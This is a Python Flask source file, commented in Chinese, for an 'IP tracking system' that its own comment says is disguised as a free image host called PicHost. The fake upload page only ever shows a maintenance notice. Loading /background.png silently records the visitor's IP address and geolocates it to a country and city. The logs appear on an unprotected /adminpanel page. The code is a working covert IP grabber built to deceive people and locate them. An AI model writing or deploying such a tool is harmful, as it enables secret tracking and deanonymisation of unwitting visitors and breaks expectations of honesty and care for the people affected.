"""
IP追踪系统 - 记录访问者IP并显示地理位置
"""
import os
import sqlite3
from flask import Flask, send_file, request, render_template_string
import requests
from datetime import datetime

app = Flask(__name__)
DB_PATH = 'ip_records.db'


def init_db():
    """初始化数据库"""
    conn = sqlite3.connect(DB_PATH)
    conn.execute('''CREATE TABLE IF NOT EXISTS ip_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT NOT NULL,
        country TEXT,
        city TEXT,
        visit_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def get_ip_info(ip):
    """获取IP地理位置信息"""
    try:
        # 本地IP处理
        if ip in ('127.0.0.1', 'localhost', '::1'):
            return {'country': '本地', 'city': 'localhost'}
        resp = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
        data = resp.json()
        return {'country': data.get('country', '未知'), 'city': data.get('city', '未知')}
    except:
        return {'country': '未知', 'city': '未知'}

def log_ip(ip):
    """记录IP到数据库"""
    info = get_ip_info(ip)
    conn = sqlite3.connect(DB_PATH)
    conn.execute('INSERT INTO ip_logs (ip, country, city) VALUES (?, ?, ?)',
                 (ip, info['country'], info['city']))
    conn.commit()
    conn.close()

@app.route('/')
def index():
    """首页 - 伪装成图床"""
    return render_template_string(INDEX_HTML)

@app.route('/background.png')
def background():
    """返回背景图片并记录IP"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    log_ip(ip)
    return send_file('background.png', mimetype='image/png')

@app.route('/adminpanel')
def admin_panel():
    """管理员面板 - 显示所有IP记录"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.execute('SELECT ip, country, city, visit_time FROM ip_logs ORDER BY visit_time DESC')
    records = cursor.fetchall()
    conn.close()

    # 统计数据
    total = len(records)
    countries = {}
    for r in records:
        countries[r[1]] = countries.get(r[1], 0) + 1

    return render_template_string(ADMIN_HTML, records=records, total=total, countries=countries)

INDEX_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PicHost - 免费图床</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: #fff; padding: 50px; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 450px; width: 90%; }
        h1 { color: #333; font-size: 28px; margin-bottom: 10px; }
        .subtitle { color: #666; margin-bottom: 30px; }
        .upload-area { border: 2px dashed #ddd; border-radius: 12px; padding: 40px 20px; margin-bottom: 20px; cursor: pointer; transition: all 0.3s; }
        .upload-area:hover { border-color: #667eea; background: #f8f9ff; }
        .upload-icon { font-size: 48px; margin-bottom: 15px; }
        .upload-text { color: #666; }
        .btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: none; padding: 14px 40px; border-radius: 8px; font-size: 16px; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(102,126,234,0.4); }
        .footer { margin-top: 30px; color: #999; font-size: 13px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); align-items: center; justify-content: center; }
        .modal.active { display: flex; }
        .modal-content { background: #fff; padding: 40px; border-radius: 12px; text-align: center; max-width: 350px; }
        .modal-content h2 { color: #e74c3c; margin-bottom: 15px; }
        .modal-content p { color: #666; margin-bottom: 20px; }
        .close-btn { background: #eee; color: #333; border: none; padding: 10px 30px; border-radius: 6px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>PicHost</h1>
        <p class="subtitle">简单、快速、免费的图片托管服务</p>
        <div class="upload-area" onclick="showMaintenance()">
            <div class="upload-icon">📷</div>
            <p class="upload-text">点击或拖拽图片到这里上传</p>
        </div>
        <button class="btn" onclick="showMaintenance()">选择图片上传</button>
        <p class="footer">支持 JPG、PNG、GIF、WebP 格式，单张最大 10MB</p>
    </div>
    <div class="modal" id="modal">
        <div class="modal-content">
            <h2>⚠️ 系统维护中</h2>
            <p>上传服务正在升级维护，请稍后再试。预计恢复时间：2小时内</p>
            <button class="close-btn" onclick="closeModal()">知道了</button>
        </div>
    </div>
    <script>
        function showMaintenance() { document.getElementById('modal').classList.add('active'); }
        function closeModal() { document.getElementById('modal').classList.remove('active'); }
        document.getElementById('modal').addEventListener('click', function(e) { if(e.target === this) closeModal(); });
    </script>
</body>
</html>
'''

ADMIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>IP追踪管理面板</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { font-size: 28px; margin-bottom: 20px; color: #38bdf8; }
        .stats { display: flex; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }
        .stat-card { background: #1e293b; padding: 20px; border-radius: 12px; min-width: 150px; }
        .stat-card h3 { color: #94a3b8; font-size: 14px; margin-bottom: 8px; }
        .stat-card .value { font-size: 32px; font-weight: bold; color: #38bdf8; }
        .country-list { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px; }
        .country-tag { background: #334155; padding: 4px 12px; border-radius: 20px; font-size: 13px; }
        table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 12px; overflow: hidden; }
        th, td { padding: 14px 16px; text-align: left; }
        th { background: #334155; color: #94a3b8; font-weight: 500; font-size: 13px; text-transform: uppercase; }
        tr:hover { background: #334155; }
        td { border-bottom: 1px solid #334155; }
        .ip { font-family: monospace; color: #fbbf24; }
        .country { color: #4ade80; }
        .time { color: #94a3b8; font-size: 13px; }
        .empty { text-align: center; padding: 60px; color: #64748b; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 IP追踪管理面板</h1>
        <div class="stats">
            <div class="stat-card">
                <h3>总访问量</h3>
                <div class="value">{{ total }}</div>
            </div>
            <div class="stat-card">
                <h3>国家/地区分布</h3>
                <div class="country-list">
                    {% for country, count in countries.items() %}
                    <span class="country-tag">{{ country }}: {{ count }}</span>
                    {% endfor %}
                </div>
            </div>
        </div>
        <table>
            <thead>
                <tr><th>IP地址</th><th>国家</th><th>城市</th><th>访问时间</th></tr>
            </thead>
            <tbody>
                {% if records %}
                    {% for r in records %}
                    <tr>
                        <td class="ip">{{ r[0] }}</td>
                        <td class="country">{{ r[1] }}</td>
                        <td>{{ r[2] }}</td>
                        <td class="time">{{ r[3] }}</td>
                    </tr>
                    {% endfor %}
                {% else %}
                    <tr><td colspan="4" class="empty">暂无访问记录，等待第一个访客...</td></tr>
                {% endif %}
            </tbody>
        </table>
    </div>
</body>
</html>
'''

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
